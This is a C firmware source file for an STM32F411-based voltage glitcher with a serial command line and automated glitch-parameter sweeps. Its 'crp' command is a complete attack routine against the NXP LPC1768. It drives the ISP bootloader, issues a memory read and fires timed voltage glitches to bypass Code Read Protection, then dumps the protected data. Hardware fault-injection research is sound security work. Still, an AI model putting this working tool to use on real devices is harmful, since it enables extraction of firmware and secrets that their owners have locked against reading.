/* main.c — Command-line interface + automated glitch sweep
 *
 * Serial commands (over USART2 @ 115200 baud):
 *
 *   help                 — show commands
 *   delay <ns>           — set glitch delay in nanoseconds
 *   width <ns>           — set glitch width in nanoseconds
 *   glitch               — fire one glitch (manual trigger)
 *   arm                  — arm & wait for EXTI0 trigger
 *   reset                — reset target
 *   isp                  — enter ISP mode on target
 *   send <text>          — send text to target UART
 *   read                 — read target UART (500ms timeout)
 *   sweep <d0> <d1> <ds> <w0> <w1> <ws>
 *                        — automated sweep:
 *                          delay from d0 to d1 step ds (ns)
 *                          width from w0 to w1 step ws (ns)
 *   status               — show current params
 *   crp                  — attempt CRP bypass glitch
 */

#include "stm32f411_glitcher.h"

/* ---- Globals ---- */
static glitch_params_t gp = {
    .delay_ns = 1000, /* 1 µs default */
    .width_ns = 100,  /* 100 ns default */
    .delay_ticks = 100,
    .width_ticks = 10,
    .repeat = 1,
    .armed = 0,
};

/* ---- Simple string helpers ---- */
static int streq(const char *a, const char *b) {
  while (*a && *b) {
    if (*a++ != *b++)
      return 0;
  }
  return *a == *b;
}

static int starts_with(const char *s, const char *prefix) {
  while (*prefix) {
    if (*s++ != *prefix++)
      return 0;
  }
  return 1;
}

static uint32_t parse_uint(const char *s) {
  uint32_t v = 0;
  while (*s == ' ')
    s++;
  while (*s >= '0' && *s <= '9') {
    v = v * 10 + (*s - '0');
    s++;
  }
  return v;
}

/* Skip to next whitespace-separated token */
static const char *next_token(const char *s) {
  while (*s && *s != ' ')
    s++;
  while (*s == ' ')
    s++;
  return s;
}

/* ============================================================
 *  Command processor
 * ============================================================ */
void cmd_process(const char *line) {
  if (streq(line, "help") || streq(line, "?")) {
    uart_pc_puts("\n=== STM32F411 Voltage Glitcher ===\n");
    uart_pc_puts("  delay <ns>      — set delay (ns)\n");
    uart_pc_puts("  width <ns>      — set width (ns)\n");
    uart_pc_puts("  glitch          — fire glitch now\n");
    uart_pc_puts("  arm             — arm, wait trigger\n");
    uart_pc_puts("  reset           — reset target\n");
    uart_pc_puts("  isp             — target ISP mode\n");
    uart_pc_puts("  send <text>     — send to target\n");
    uart_pc_puts("  read            — read target UART\n");
    uart_pc_puts("  sweep d0 d1 ds w0 w1 ws\n");
    uart_pc_puts("  crp             — CRP bypass attempt\n");
    uart_pc_puts("  status          — show params\n");
    uart_pc_puts("  help            — this message\n\n");
  } else if (starts_with(line, "delay ")) {
    uint32_t ns = parse_uint(line + 6);
    glitch_set_params(&gp, ns, gp.width_ns);
    uart_pc_puts("[OK] delay=");
    uart_pc_put_dec(gp.delay_ns);
    uart_pc_puts(" ns (");
    uart_pc_put_dec(gp.delay_ticks);
    uart_pc_puts(" ticks)\n");
  } else if (starts_with(line, "width ")) {
    uint32_t ns = parse_uint(line + 6);
    glitch_set_params(&gp, gp.delay_ns, ns);
    uart_pc_puts("[OK] width=");
    uart_pc_put_dec(gp.width_ns);
    uart_pc_puts(" ns (");
    uart_pc_put_dec(gp.width_ticks);
    uart_pc_puts(" ticks)\n");
  } else if (streq(line, "glitch")) {
    uart_pc_puts("[GLITCH] Firing: delay=");
    uart_pc_put_dec(gp.delay_ns);
    uart_pc_puts("ns width=");
    uart_pc_put_dec(gp.width_ns);
    uart_pc_puts("ns\n");
    glitch_fire_manual(&gp);
    uart_pc_puts("[GLITCH] Done\n");
  } else if (streq(line, "arm")) {
    uart_pc_puts("[ARM] Waiting for trigger on PA0...\n");
    glitch_fire_on_trigger(&gp);
  } else if (streq(line, "reset")) {
    uart_pc_puts("[TARGET] Resetting...\n");
    target_reset();
    uart_pc_puts("[TARGET] Reset complete\n");
  } else if (streq(line, "isp")) {
    target_enter_isp();
  } else if (starts_with(line, "send ")) {
    uart_target_puts(line + 5);
    uart_target_puts("\r\n");
    uart_pc_puts("[SENT] ");
    uart_pc_puts(line + 5);
    uart_pc_puts("\n");
  } else if (streq(line, "read")) {
    char buf[256];
    int n = uart_target_read_line(buf, sizeof(buf), 500);
    if (n > 0) {
      uart_pc_puts("[RX] ");
      uart_pc_puts(buf);
      uart_pc_puts("\n");
    } else {
      uart_pc_puts("[RX] (no data)\n");
    }
  } else if (streq(line, "status")) {
    uart_pc_puts("  delay : ");
    uart_pc_put_dec(gp.delay_ns);
    uart_pc_puts(" ns (");
    uart_pc_put_dec(gp.delay_ticks);
    uart_pc_puts(" ticks)\n");
    uart_pc_puts("  width : ");
    uart_pc_put_dec(gp.width_ns);
    uart_pc_puts(" ns (");
    uart_pc_put_dec(gp.width_ticks);
    uart_pc_puts(" ticks)\n");
  } else if (starts_with(line, "sweep ")) {
    /* Parse: sweep d0 d1 ds w0 w1 ws */
    const char *p = line + 6;
    uint32_t d0 = parse_uint(p);
    p = next_token(p);
    uint32_t d1 = parse_uint(p);
    p = next_token(p);
    uint32_t ds = parse_uint(p);
    p = next_token(p);
    uint32_t w0 = parse_uint(p);
    p = next_token(p);
    uint32_t w1 = parse_uint(p);
    p = next_token(p);
    uint32_t ws = parse_uint(p);

    if (ds == 0)
      ds = 10;
    if (ws == 0)
      ws = 10;

    uart_pc_puts("[SWEEP] delay ");
    uart_pc_put_dec(d0);
    uart_pc_puts("-");
    uart_pc_put_dec(d1);
    uart_pc_puts("/");
    uart_pc_put_dec(ds);
    uart_pc_puts("  width ");
    uart_pc_put_dec(w0);
    uart_pc_puts("-");
    uart_pc_put_dec(w1);
    uart_pc_puts("/");
    uart_pc_put_dec(ws);
    uart_pc_puts("\n");

    uint32_t total = 0, hits = 0, mutes = 0;

    for (uint32_t d = d0; d <= d1; d += ds) {
      for (uint32_t w = w0; w <= w1; w += ws) {
        glitch_set_params(&gp, d, w);

        /* Reset target, wait for boot */
        target_reset();
        delay_ms(50);

        /* Fire glitch */
        glitch_fire_manual(&gp);

        /* Check target response */
        delay_ms(100);
        char buf[128];
        int n = uart_target_read_line(buf, sizeof(buf), 200);

        total++;

        if (n == 0) {
          mutes++;
          /* Target silent — possibly crashed */
          uart_pc_puts("  M ");
        } else {
          /* Check for unexpected response (success!) */
          /* Customize this check for your target */
          uart_pc_puts("  N d=");
          uart_pc_put_dec(d);
          uart_pc_puts(" w=");
          uart_pc_put_dec(w);
          uart_pc_puts(" [");
          uart_pc_puts(buf);
          uart_pc_puts("]\n");

          /* Example: detect CRP bypass */
          if (buf[0] == '0') { /* ISP returns '0\r\n' on success */
            hits++;
            uart_pc_puts("  *** HIT *** d=");
            uart_pc_put_dec(d);
            uart_pc_puts(" w=");
            uart_pc_put_dec(w);
            uart_pc_puts("\n");
          }
        }

        /* Check for abort from PC */
        if (USART2->SR & USART_SR_RXNE) {
          char c = USART2->DR & 0xFF;
          if (c == 'q' || c == 0x03) { /* 'q' or Ctrl-C */
            uart_pc_puts("\n[SWEEP] Aborted by user\n");
            goto sweep_done;
          }
        }
      }
    }
  sweep_done:
    uart_pc_puts("[SWEEP] Done. total=");
    uart_pc_put_dec(total);
    uart_pc_puts(" hits=");
    uart_pc_put_dec(hits);
    uart_pc_puts(" mutes=");
    uart_pc_put_dec(mutes);
    uart_pc_puts("\n");
  } else if (streq(line, "crp")) {
    /* ============================================================
     *  CRP Bypass Attack for LPC1768
     *
     *  Strategy:
     *  1) Enter ISP mode
     *  2) Send "R 0 4\r\n" (read CRP word at address 0x000002FC)
     *  3) Glitch during the CRP check in bootloader
     *  4) If bootloader returns data instead of error → success
     *
     *  The CRP check happens during ISP command parsing.
     *  We sweep delay to find the right moment.
     * ============================================================ */
    uart_pc_puts("[CRP] Starting CRP bypass sweep...\n");
    uart_pc_puts("[CRP] This will reset target many times.\n");

    uint32_t attempts = 0, successes = 0;

    for (uint32_t d = 500; d <= 50000; d += 50) {
      for (uint32_t w = 50; w <= 500; w += 50) {
        glitch_set_params(&gp, d, w);

        /* Enter ISP */
        target_reset();
        delay_ms(100);

        /* Quick sync */
        uart_target_putc('?');
        delay_ms(30);
        char buf[128];
        int n = uart_target_read_line(buf, sizeof(buf), 100);
        if (n < 4 || buf[0] != 'S')
          continue; /* sync failed */

        uart_target_puts("Synchronized\r\n");
        delay_ms(20);
        uart_target_read_line(buf, sizeof(buf), 100);
        uart_target_read_line(buf, sizeof(buf), 100);
        uart_target_puts("12000\r\n");
        delay_ms(20);
        uart_target_read_line(buf, sizeof(buf), 100);
        uart_target_read_line(buf, sizeof(buf), 100);

        /* Send read command — this triggers CRP check */
        uart_target_puts("R 0 4\r\n");

        /* Fire glitch after short delay */
        glitch_fire_manual(&gp);

        /* Read response */
        delay_ms(50);
        n = uart_target_read_line(buf, sizeof(buf), 200);
        attempts++;

        if (n > 0 && buf[0] == '0') {
          /* '0' means command OK — CRP was bypassed! */
          successes++;
          uart_pc_puts("\n!!! CRP BYPASS !!! d=");
          uart_pc_put_dec(d);
          uart_pc_puts(" w=");
          uart_pc_put_dec(w);
          uart_pc_puts("\n");

          /* Read the data */
          n = uart_target_read_line(buf, sizeof(buf), 200);
          if (n > 0) {
            uart_pc_puts("[DATA] ");
            uart_pc_puts(buf);
            uart_pc_puts("\n");
          }
        }

        /* Print progress every 100 attempts */
        if (attempts % 100 == 0) {
          uart_pc_puts("  [");
          uart_pc_put_dec(attempts);
          uart_pc_puts("] d=");
          uart_pc_put_dec(d);
          uart_pc_puts(" w=");
          uart_pc_put_dec(w);
          uart_pc_puts("\n");
        }

        /* Abort check */
        if (USART2->SR & USART_SR_RXNE) {
          if ((USART2->DR & 0xFF) == 'q') {
            uart_pc_puts("\n[CRP] Aborted\n");
            goto crp_done;
          }
        }
      }
    }
  crp_done:
    uart_pc_puts("[CRP] Finished. attempts=");
    uart_pc_put_dec(attempts);
    uart_pc_puts(" successes=");
    uart_pc_put_dec(successes);
    uart_pc_puts("\n");
  } else if (line[0] != '\0') {
    uart_pc_puts("[ERR] Unknown: ");
    uart_pc_puts(line);
    uart_pc_puts("\n");
  }
}

/* ============================================================
 *  Read a command line from PC UART (with echo)
 * ============================================================ */
static int read_cmd_line(char *buf, int maxlen) {
  int i = 0;
  while (i < maxlen - 1) {
    int c = uart_pc_getc();
    if (c == '\r' || c == '\n') {
      uart_pc_puts("\r\n");
      break;
    }
    if (c == 0x08 || c == 0x7F) { /* backspace */
      if (i > 0) {
        i--;
        uart_pc_puts("\b \b");
      }
      continue;
    }
    buf[i++] = (char)c;
    uart_pc_putc((char)c); /* echo */
  }
  buf[i] = '\0';
  return i;
}

/* ============================================================
 *  Main
 * ============================================================ */
int main(void) {
  clock_init_100mhz();
  dwt_init();
  gpio_init();
  uart_pc_init(115200);
  uart_target_init(115200); /* LPC1768 ISP default: 115200 */
  timer_glitch_init();
  trigger_exti_init();

  /* Enable interrupts */
  __asm volatile("cpsie i");

  uart_pc_puts("\r\n\n");
  uart_pc_puts("========================================\n");
  uart_pc_puts("  STM32F411 Voltage Glitcher v1.0\n");
  uart_pc_puts("  Target: LPC1768 (NXP Cortex-M3)\n");
  uart_pc_puts("  Clock : 100 MHz (10 ns resolution)\n");
  uart_pc_puts("========================================\n");
  uart_pc_puts("Type 'help' for commands.\n\n");

  glitch_set_params(&gp, 1000, 100); /* defaults */

  char cmd[256];

  while (1) {
    uart_pc_puts("glitch> ");
    read_cmd_line(cmd, sizeof(cmd));
    cmd_process(cmd);
  }

  return 0;
}